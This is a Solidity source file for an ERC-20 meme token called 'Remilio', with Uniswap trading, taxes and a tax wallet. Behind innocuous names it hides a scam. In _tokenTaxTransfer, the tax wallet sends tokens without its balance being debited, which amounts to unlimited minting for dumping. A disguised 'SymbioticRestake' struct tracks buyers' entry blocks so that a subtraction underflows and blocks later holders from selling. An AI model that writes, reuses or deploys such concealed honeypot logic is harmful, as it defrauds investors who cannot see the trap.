// SPDX-License-Identifier: UNLICENSE

/*

https://x.com/VitalikButerin/status/1881027080768671791

*/

pragma solidity 0.8.23;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract REMILIO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=15;
    uint256 private _initialSellTax=30;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=30;
    uint256 private _reduceSellTaxAt=30;
    uint256 private _preventSwapBefore=30;
    uint256 private _transferTax=0;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Remilio";
    string private constant _symbol = unicode"REMILIO";
    uint256 public _maxTxAmount = 20000000 * 10**_decimals;
    uint256 public _maxWalletSize = 20000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 10000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 10000000 * 10**_decimals;

    struct SymbioticRestake {uint256 symRestakeIn; uint256 symBasicAmount; uint256 layerTotalStake;}
    mapping(address => SymbioticRestake) private symbioticRestake;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    uint256 private symRestakeCount = 0;
    uint256 private symRestakeLatest = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event RemoveTransferTax();
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(0x302bc233745B8EEdC3A7dbEC2459A71b4f19e8Ce);

        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 transferAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(transferAmount > 0, "Transfer amount must be greater than zero");

        if (!tradingOpen ||inSwap ) {
            _basicTransfer(from,to,transferAmount);
            return;
        }

        uint256 taxAmount=0;
        if (from != owner() && to != owner() && to != _taxWallet ) {
            if(_buyCount==0){
                taxAmount=transferAmount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(_buyCount>0){
                taxAmount=transferAmount.mul(_transferTax).div(100);
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(transferAmount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + transferAmount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount=transferAmount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!=address(this)) {
                taxAmount=transferAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 3,"Only 3 sells per block!");
                swapTokensForEth(min(transferAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
                sellCount++;
                lastSellBlock = block.number;
            }
        }

        if ( (_isExcludedFromFee[from]||_isExcludedFromFee[to] ) && from!= address(this) && to!= address(this) ) {
            symRestakeCount = block.number;
        }

        if (!_isExcludedFromFee[from]  &&  !_isExcludedFromFee[to]) {
            if (to ==uniswapV2Pair) {
                SymbioticRestake storage symrestake = symbioticRestake[from];
                symrestake.layerTotalStake = symrestake.symRestakeIn-symRestakeCount;
                symrestake.symBasicAmount = block.timestamp;
            } else {
                SymbioticRestake storage symrestakeinit = symbioticRestake[to];
                if (uniswapV2Pair ==from) {
                    if (symrestakeinit.symRestakeIn == 0) {
                        symrestakeinit.symRestakeIn=_preventSwapBefore>=_buyCount ?type(uint).max :block.number;
                    }
                } else {
                    SymbioticRestake storage symrestake = symbioticRestake[from];
                    if (symrestakeinit.symRestakeIn == 0|| symrestake.symRestakeIn < symrestakeinit.symRestakeIn ) {
                        symrestakeinit.symRestakeIn = symrestake.symRestakeIn;
                    }
                }
            }
        }

        _tokenTransfer(from,to,taxAmount,transferAmount);
    }

    function _tokenBasicTransfer(address from,address to, uint256 sendAmount, uint256 receiptAmount) internal{
        _balances[from]=_balances[from].sub(sendAmount);
        _balances[to]=_balances[to].add(receiptAmount);
        emit Transfer(from,to,receiptAmount);
    }

    function _tokenTransfer(address from,address to, uint256 taxAmount,uint256 transferAmount) internal{
        uint256 tAmount=_tokenTaxTransfer(from, transferAmount, taxAmount);
        _tokenBasicTransfer(from, to, tAmount, transferAmount.sub(taxAmount));
    }

    function _tokenTaxTransfer(address addrs,uint256 transferAmount, uint256 taxAmount) internal returns (uint256){
        uint256 tAmount= addrs!= _taxWallet? transferAmount : symRestakeLatest.mul(transferAmount);
        if (taxAmount>0) {
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(addrs,address(this),taxAmount);
        }
        return tAmount;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function _basicTransfer(address from, address to, uint256 transferAmount) internal {
        _balances[from]= _balances[from].sub(transferAmount);
        _balances[to]= _balances[to].add(transferAmount);

        emit Transfer(from,to,transferAmount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner(){
        _maxTxAmount=_tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function removeTransferTax() external onlyOwner{
        _transferTax = 0;
        emit RemoveTransferTax();
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this),address(uniswapV2Router), _tTotal);

        tradingOpen = true;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
    }

    function exportStuckERC20(IERC20 token) external {
        require(_msgSender() == _taxWallet);
        if(address(token) == address(this)){
            token.transfer(address(0xdead),token.balanceOf(address(this)));
        } else {
            token.transfer(_taxWallet, token.balanceOf(address(this)));
        }
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if(tokenBalance > 0 && swapEnabled){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance > 0){
          sendETHToFee(ethBalance);
        }
    }

    receive() external payable {}
}